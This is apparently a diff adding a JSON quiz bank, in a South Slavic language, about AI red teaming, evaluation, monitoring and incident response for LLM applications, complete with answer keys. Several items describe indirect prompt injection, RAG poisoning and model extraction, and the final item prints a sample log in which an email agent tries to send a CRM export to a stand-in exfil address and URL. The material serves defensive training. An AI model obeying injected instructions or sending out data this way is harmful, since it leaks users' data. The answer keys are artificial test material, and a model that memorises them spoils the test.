@@ -1,0 +1,290 @@
+[
+  {
+    "obj": "5.1",
+    "q": "Tim planira red teaming za internog asistenta koji koristi model komercijalnog dobavljača, RAG nad internim dokumentima i alat za kreiranje tiketa. Gdje treba usmjeriti najviše napora?",
+    "options": [
+      "Na testiranje sposobnosti samog modela, jer dobavljač ne objavljuje rezultate",
+      "Na spojeve sistema: sistemski prompt, RAG sa internim dokumentima, alate i njihova prava, upotrebu izlaza u aplikaciji",
+      "Na mjerenje brzine odgovora modela",
+      "Na DoS testove nad infrastrukturom dobavljača"
+    ],
+    "answer": 1,
+    "explain": "Dobavljač testira model; organizacija odgovara za sistem koji je oko modela izgradila, i tu je većina ozbiljnih nalaza. DoS na dijeljenoj infrastrukturi dobavljača je tipično van obima i krši uslove korištenja."
+  },
+  {
+    "obj": "5.1",
+    "q": "Red team je pronašao da agent u 7 od 10 pokretanja izvrši neželjeni poziv alata. Developer je ponovio test jednom, ništa se nije dogodilo, pa je zatvorio tiket. Šta je pogrešno?",
+    "options": [
+      "Ništa, nalaz koji se ne može ponoviti nije validan",
+      "Tiket je trebalo prebaciti dobavljaču modela",
+      "Trebalo je povećati temperaturu i ponoviti",
+      "Ponašanje je nedeterminističko; nalaz se ocjenjuje stopom kroz više pokretanja, a popravka se dokazuje regresionim testom sa više pokretanja"
+    ],
+    "answer": 3,
+    "explain": "Isti ulaz kod LLM-a ne daje uvijek isti izlaz. Jedno uspješno pokretanje ne dokazuje da je rizik nestao. Zato izvještaj sadrži stopu ponovljivosti, a evaluacija pokreće svaki slučaj više puta."
+  },
+  {
+    "obj": "5.1",
+    "q": "Koja je glavna razlika između evaluacije i AI red teaminga?",
+    "options": [
+      "Evaluacija je automatizovana i ponovljiva prema definisanim kriterijumima, a red teaming ciljano istražuje nepredviđene načine zakazivanja i zloupotrebe",
+      "Evaluacija se radi samo prije lansiranja, a red teaming u svakom CI pokretanju",
+      "Red teaming mjeri samo tačnost, a evaluacija samo sigurnost",
+      "Nema razlike, to su sinonimi"
+    ],
+    "answer": 0,
+    "explain": "Evaluacija provjerava poznato i radi uz svaku izmjenu; red teaming otkriva nepoznato, uglavnom ručno i periodično. Nalazi red teama postaju novi slučajevi u evaluaciji."
+  },
+  {
+    "obj": "5.1",
+    "q": "Nakon red team nalaza tim je u sistemski prompt dodao rečenicu koja zabranjuje problematično ponašanje i zatvorio nalaz. Šta nedostaje?",
+    "options": [
+      "Prevod prompta na engleski",
+      "Ponovno treniranje modela od nule",
+      "Kontrola izvan modela (npr. allowlista ili provjera prava) i regresioni test u evaluacionom skupu koji dokazuje da radi",
+      "Duži sistemski prompt sa više primjera"
+    ],
+    "answer": 2,
+    "explain": "Instrukcija u promptu nije pouzdana kontrola i sljedeća verzija modela je može ignorisati. Popravka je deterministička kontrola u arhitekturi i test koji se pokreće uz svaku izmjenu."
+  },
+  {
+    "obj": "5.1",
+    "q": "Pravila angažmana za red teaming agenta koji ima alat za slanje e-pošte i pristup CRM-u. Šta je ispravno?",
+    "options": [
+      "Testirati u produkciji jer samo tamo postoje pravi podaci",
+      "Testirati na produkcijskom CRM-u, ali noću",
+      "Isključiti alate tokom testa da ne bi bilo štete",
+      "Staging sa sintetičkim podacima, alati spojeni na mock servise ili sandbox naloge, nalazi u ograničenom repozitoriju"
+    ],
+    "answer": 3,
+    "explain": "Test mora vidjeti stvarne alate i kontrole, ali bez stvarne posljedice; zato mock ili sandbox. Isključeni alati znače da se ne testira najrizičniji dio. Primjeri koji izazivaju štetno ponašanje su osjetljivi i ne idu u javne tikete."
+  },
+  {
+    "obj": "5.1",
+    "q": "Nakon pooštravanja guardraila attack success rate je pao na nulu, ali korisnici se žale da asistent odbija obične zahtjeve. Koju metriku je tim trebao pratiti uz attack success rate?",
+    "options": [
+      "Broj tokena po odgovoru",
+      "False refusal rate na skupu legitimnih zahtjeva",
+      "Broj GPU sati",
+      "Veličinu vektorskog indeksa"
+    ],
+    "answer": 1,
+    "explain": "Sigurnost i upotrebljivost se mjere zajedno. Previsok false refusal rate tjera korisnike na zaobilaženje (npr. javne alate). Zato evaluacija ima prag za oba."
+  },
+  {
+    "obj": "5.1",
+    "q": "Tim koristi LLM kao sudiju da ocijeni da li je agent poštovao politiku poziva alata. Šta je bolji pristup za ovu kategoriju?",
+    "options": [
+      "Deterministička provjera logova poziva alata prema allowlisti i pravilima argumenata",
+      "Dva LLM sudije umjesto jednog",
+      "Ručno čitanje svih logova jednom godišnje",
+      "Isključiti ovu kategoriju iz evaluacije"
+    ],
+    "answer": 0,
+    "explain": "Za kategorije koje se mogu provjeriti pravilom (šema, allowlista, canary) deterministička provjera je tačna, brza i ne griješi kao model. LLM sudija je koristan za kategorije kao što je utemeljenost, uz kalibraciju na ručno označenom uzorku."
+  },
+  {
+    "obj": "5.1",
+    "q": "Koje izmjene treba da pokrenu evaluacioni skup u CI-ju?",
+    "options": [
+      "Samo promjena verzije modela",
+      "Samo promjena koda aplikacije",
+      "Promjena verzije modela, sistemskog prompta, šablona, liste ili prava alata, konfiguracije RAG-a i guardrail pravila",
+      "Samo izmjene koje odobri pravni tim"
+    ],
+    "answer": 2,
+    "explain": "Ponašanje AI sistema zavisi od svih ovih elemenata; svaki od njih može ukloniti zaštitu ili otvoriti novi put do posljedice."
+  },
+  {
+    "obj": "5.1",
+    "q": "Dio evaluacionog skupa za sigurnost preuzet je iz javnog benchmarka. Novi model ga prolazi skoro savršeno, ali red team brzo nalazi probleme. Koje je najvjerovatnije objašnjenje i mjera?",
+    "options": [
+      "Red team koristi pogrešne alate; treba vjerovati benchmarku",
+      "Kontaminacija: model je vjerovatno viđao javni skup; dio skupa treba držati privatnim i dopunjavati ga nalazima red teama",
+      "Model je bolji od red teama",
+      "Benchmark treba pokretati samo jednom"
+    ],
+    "answer": 1,
+    "explain": "Javni skupovi mogu završiti u podacima za treniranje, pa rezultat precjenjuje otpornost. Privatni, verzionisani skup vezan za tvoje kontrole je pouzdaniji."
+  },
+  {
+    "obj": "5.1",
+    "q": "Kako u izvještaju red teama treba označiti nalaz da agent, na osnovu sadržaja nepouzdanog dokumenta iz RAG-a, poziva alat sa neželjenim argumentima?",
+    "options": [
+      "Samo kao „bug“, bez kategorije",
+      "OWASP LLM03 Supply Chain",
+      "OWASP LLM09 Misinformation",
+      "OWASP LLM01 (indirektni prompt injection) i LLM06, ASI01/ASI02, ATLAS AML.T0051 i AML.T0053"
+    ],
+    "answer": 3,
+    "explain": "Uputstvo stiže kroz nepouzdan sadržaj (indirektni LLM01, ASI01 Agent Goal Hijack), a posljedica je zloupotreba alata (LLM06 Excessive Agency, ASI02 Tool Misuse & Exploitation; ATLAS AML.T0053 AI Agent Tool Invocation). Mapiranje omogućava poređenje i praćenje."
+  },
+  {
+    "obj": "5.2",
+    "q": "Agent je izvršio neočekivanu akciju u CRM-u. Logovi sadrže samo HTTP status i latenciju. Šta je trebalo logovati da bi istraga bila moguća?",
+    "options": [
+      "Samo puni tekst svih promptova, trajno",
+      "Samo IP adresu korisnika",
+      "trace_id, korisnika, verzije modela i prompta, ID-jeve RAG izvora, pozive alata sa redigovanim argumentima i odlukom politike",
+      "Samo broj tokena"
+    ],
+    "answer": 2,
+    "explain": "Istraga traži da se poveže šta je model vidio, šta je odlučio i šta je izvršeno, i koja verzija je to uradila. Puni prompt trajno je rizik za privatnost; IP i tokeni sami ne objašnjavaju ponašanje."
+  },
+  {
+    "obj": "5.2",
+    "q": "SIEM tim traži da se puni tekst svih promptova i odgovora šalje u centralni SIEM sa retencijom od dvije godine. Koji je najbolji odgovor?",
+    "options": [
+      "U SIEM ide redigovana telemetrija (metapodaci, verdikti, pozivi alata); puni sadržaj, ako treba, u odvojeno skladište sa kratkom retencijom i pristupom samo za istragu",
+      "Prihvatiti, jer više podataka znači bolju detekciju",
+      "Odbiti svako logovanje AI sistema zbog GDPR-a",
+      "Slati puni sadržaj, ali samo za administratore"
+    ],
+    "answer": 0,
+    "explain": "Promptovi sadrže lične podatke, poslovne tajne i zalijepljene kredencijale. Široko dostupan log sa dugom retencijom postaje kanal curenja. Bez ikakvog logovanja nema detekcije ni istrage."
+  },
+  {
+    "obj": "5.2",
+    "q": "Koji skup atributa pripada OpenTelemetry semantičkim konvencijama za generativni AI?",
+    "options": [
+      "http.llm.prompt i http.llm.answer",
+      "ai.model_name i ai.cost_usd",
+      "otel.genai.secret i otel.genai.user_password",
+      "gen_ai.request.model, gen_ai.usage.input_tokens, gen_ai.usage.output_tokens"
+    ],
+    "answer": 3,
+    "explain": "OTel GenAI konvencije koriste prefiks gen_ai.; konvencije su još u razvoju, pa treba pinovati verziju. Snimanje sadržaja poruka je namjerno opciono."
+  },
+  {
+    "obj": "5.2",
+    "q": "Monitoring pokazuje da se isti chunk jednog nedavno dodatog eksternog dokumenta pojavljuje u kontekstu stotina nepovezanih upita, a uz njega rastu blokirani pozivi alata. Šta je najvjerovatnije i koji je prvi korak?",
+    "options": [
+      "Normalna popularnost dokumenta; ne treba ništa",
+      "Trovanje RAG indeksa (ATLAS AML.T0070); karantin dokumenta i isključenje izvora, uz čuvanje dokaza",
+      "Greška embedding modela; treba ga odmah zamijeniti",
+      "Napad na DNS; treba promijeniti resolver"
+    ],
+    "answer": 1,
+    "explain": "Dokument koji se dohvata za nepovezane upite i uz koji rastu blokirani pozivi alata ukazuje na sadržaj optimizovan za retrieval sa ugrađenim uputstvima. Prvo se obuzdava (karantin), pa istražuje ingest."
+  },
+  {
+    "obj": "5.2",
+    "q": "Nakon deploya nove verzije sistemskog prompta stopa neuspjeha JSON Schema validacije porasla je sa 0,5% na 9%. Koja je prva akcija?",
+    "options": [
+      "Rollback (pin) na prethodnu verziju prompta, pa evaluacija i regresioni test",
+      "Isključiti validaciju šeme dok se ne popravi",
+      "Povećati max_tokens",
+      "Sačekati sedmicu da vidi da li će se stabilizovati"
+    ],
+    "answer": 0,
+    "explain": "Verzionisan prompt omogućava brz rollback. Isključivanje validacije otvara put nesigurnom izlazu nizvodno (LLM05). Ovo je i znak da evaluacija u CI-ju nije imala dovoljan prag za šemu."
+  },
+  {
+    "obj": "5.2",
+    "q": "Agent počinje da šalje neželjene e-poruke klijentima, uzrok još nije poznat. Koja poluga za obuzdavanje je najprikladnija kao prvi korak?",
+    "options": [
+      "Brisanje svih logova da se ne bi proširilo",
+      "Povratak na prethodnu verziju embedding modela",
+      "Isključenje alata koji mijenjaju stanje ili prebacivanje autonomije na potvrdu svake akcije, uz čuvanje logova i verzija",
+      "Ponovno treniranje modela"
+    ],
+    "answer": 2,
+    "explain": "Prvo se zaustavlja posljedica, a to su akcije alata. Kill switch za alate i nivo autonomije pripremaju se unaprijed. Brisanje logova uništava dokaze, a retrening je spor i ne mora biti povezan sa uzrokom."
+  },
+  {
+    "obj": "5.2",
+    "q": "Prije bilo kakvih izmjena tokom AI incidenta, šta treba sačuvati kao dokaz da bi ponašanje moglo da se reprodukuje?",
+    "options": [
+      "Samo screenshot odgovora",
+      "Samo verziju Python interpretera",
+      "Samo račun dobavljača modela",
+      "Logove i traceove, digest modela, verziju sistemskog prompta i konfiguracije, snimak ili spisak dokumenata indeksa sa hashevima, stanje kill switcheva"
+    ],
+    "answer": 3,
+    "explain": "Model, prompt i indeks se stalno mijenjaju; bez tačnih verzija i stanja indeksa incident se ne može reprodukovati ni razumjeti."
+  },
+  {
+    "obj": "5.2",
+    "q": "Jedan nalog šalje desetine hiljada upita sistematski raspoređenih preko prostora ulaza, a trošak tokena raste. Koje kategorije ovo signalizira?",
+    "options": [
+      "LLM07 System Prompt Leakage i AML.T0056",
+      "Ekstrakcija modela (AML.T0024) ili cost harvesting (AML.T0034), u OWASP LLM10 Unbounded Consumption",
+      "LLM08 Vector and Embedding Weaknesses",
+      "Trovanje podataka za treniranje (AML.T0020)"
+    ],
+    "answer": 1,
+    "explain": "Veliki obim i sistematski raspored upita odgovaraju ekstrakciji ili troškovnom napadu. Odgovor je hitna kvota, blokada naloga i rotacija ključeva."
+  },
+  {
+    "obj": "5.2",
+    "q": "Pružalac visokorizičnog AI sistema iz Aneksa III u EU pita koja odredba AI Acta propisuje prijavu ozbiljnih incidenata. Šta je tačno?",
+    "options": [
+      "Član 5, zabranjene prakse",
+      "Član 50, obaveze transparentnosti",
+      "Član 73, prijavljivanje ozbiljnih incidenata, kad za sistem počnu da važe obaveze za visokorizične sisteme",
+      "AI Act ne propisuje prijavu incidenata"
+    ],
+    "answer": 2,
+    "explain": "Član 73 uređuje prijavu ozbiljnih incidenata za visokorizične sisteme; rokovi primjene za Aneks III su nakon AI Omnibusa pomjereni (najkasnije 2. 12. 2027). Član 5 su zabrane, član 50 transparentnost."
+  },
+  {
+    "obj": "5.2",
+    "q": "Incident je zatvoren: zatrovan dokument je uklonjen iz indeksa. Šta je ključni korak faze pouka da se isti tip incidenta ne ponovi?",
+    "options": [
+      "Kontrola u ingest pipelineu za taj tip izvora i novi regresioni test u evaluacionom skupu",
+      "Promjena dobavljača modela",
+      "Dodavanje upozorenja u korisnički interfejs",
+      "Brisanje cijelog indeksa jednom mjesečno"
+    ],
+    "answer": 0,
+    "explain": "Uzrok je ulaz nepouzdanog sadržaja u indeks, pa se kontrola dodaje u ingest, a test dokazuje da kontrole (npr. blokada alata za nepouzdan kontekst) rade i ubuduće."
+  },
+  {
+    "obj": "5.1",
+    "type": "order",
+    "q": "Poredaj korake red teaming angažmana za LLM aplikaciju.",
+    "options": [
+      "Pretvaranje nalaza u regresione testove u CI-ju",
+      "Definisanje obima: verzije modela i prompta, RAG izvori, alati, kategorije rizika mapirane na OWASP i ATLAS",
+      "Izvještaj sa uslovom, posljedicom, kontrolom koja nije radila i stopom ponovljivosti",
+      "Pisana pravila angažmana i staging sa sintetičkim podacima i mock alatima",
+      "Izvođenje: automatizovano skeniranje i ručno istraživanje scenarija vezanih za arhitekturu"
+    ],
+    "answer": [1, 3, 4, 2, 0],
+    "explain": "Obim prethodi pravilima i okruženju; tek tada se testira. Izvještaj opisuje kontrole, a angažman nije završen dok nalazi ne postanu automatski testovi."
+  },
+  {
+    "obj": "5.2",
+    "type": "match",
+    "q": "Upari signal iz monitoringa sa najvjerovatnijim uzrokom.",
+    "options": [
+      "Canary vrijednost iz sistemskog prompta pojavljuje se u odgovorima",
+      "Trošak tokena po sesiji raste, a agent ponavlja iste pozive alata",
+      "Stopa odbijanja legitimnih zahtjeva skoči odmah nakon deploya",
+      "Mnogo blokiranih poziva alata u sesijama gdje je kontekst iz istog novog eksternog dokumenta"
+    ],
+    "targets": [
+      "Regresija modela ili prompta",
+      "Indirektni prompt injection kroz RAG",
+      "Curenje sistemskog prompta (LLM07)",
+      "Petlja agenta, neograničena potrošnja (LLM10)",
+      "Istek TLS sertifikata"
+    ],
+    "answer": [2, 3, 0, 1],
+    "explain": "Canary u izlazu je curenje prompta; ponavljanje poziva uz rast troška je petlja agenta; nagla promjena ponašanja nakon deploya je regresija; blokirani pozivi vezani za isti eksterni izvor ukazuju na indirektni injection. Istek sertifikata ne daje nijedan od ovih signala."
+  },
+  {
+    "obj": "5.2",
+    "q": "Ovo je trace jedne sesije asistenta za e-poštu. Šta se NAJVJEROVATNIJE desilo i koji je ispravan odgovor?",
+    "snippet": "10:02:09 s-81 user=ana  prompt=\"Sažmi mi današnju poštu\"\n10:02:11 s-81 user=ana  tool=read_inbox ok (14 poruka; MSG-5521 from=billing@partner-invoices.example)\n10:02:13 s-81 user=ana  tool=send_email to=exfil@mailbox.example BLOCKED(recipient not allowlisted)\n10:02:14 s-81 user=ana  tool=send_email to=exfil@mailbox.example attach=crm_export BLOCKED\n10:02:16 s-81 user=ana  tool=http_get url=https://exfil.example/c?d=Q1JNX0VYUE9SVA BLOCKED(unknown_tool)\n10:02:17 s-81 user=ana  output_filter: 3 IBAN uzorka uklonjena iz odgovora",
+    "lang": "log",
+    "options": [
+      "Indirektni prompt injection kroz poruku MSG-5521: prekinuti sesiju, staviti poruku u karantin, potražiti druge sesije koje su čitale poruke tog pošiljaoca i sačuvati trace kao dokaz",
+      "Ana je zlonamjerni insajder; odmah blokirati njen nalog",
+      "Halucinacija modela bez sigurnosnog značaja, jer su svi pozivi blokirani",
+      "Neograničena potrošnja (LLM10); smanjiti limit tokena po sesiji"
+    ],
+    "answer": 0,
+    "explain": "Korisnica je tražila samo sažetak, a odmah nakon čitanja inboxa (sa porukom spoljnog pošiljaoca) model predlaže slanje CRM izvoza na spoljnu adresu i http_get sa podacima u URL-u, uz ponavljanje odbijenog poziva sa varijacijama: obrazac indirektnog prompt injectiona. Kontrole su radile, ali incident i dalje traži obuzdavanje (prekid sesije, karantin izvora), traženje istog sadržaja u drugim sesijama i čuvanje tracea. Ništa ne ukazuje da je Ana namjerno tražila eksfiltraciju, blokirani pokušaji su sigurnosni signal, a ne bezazlena halucinacija, a obim poziva nije neuobičajen."
+  }
+]
